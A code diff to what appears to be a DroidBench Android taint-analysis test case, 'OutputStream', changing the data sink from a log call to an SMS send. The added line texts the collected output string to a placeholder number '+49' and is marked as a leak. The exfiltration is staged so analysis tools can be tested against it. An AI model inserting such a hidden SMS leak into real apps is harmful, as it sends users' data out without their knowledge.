@@ -1,11 +1,11 @@
 package edu.mit.outputstream;
 
-import java.io.ByteArrayOutputStream;
-
 import android.app.Activity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
+
+import java.io.ByteArrayOutputStream;
 
 /**
  * @testcase_name OutputStream
@@ -31,6 +31,7 @@ public class MainActivity extends Activity {
 	
 	String outString = out.toString();
 	
-        Log.i("DroidBench", outString);
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, outString, null, null);  //sink, leak
     }
 }
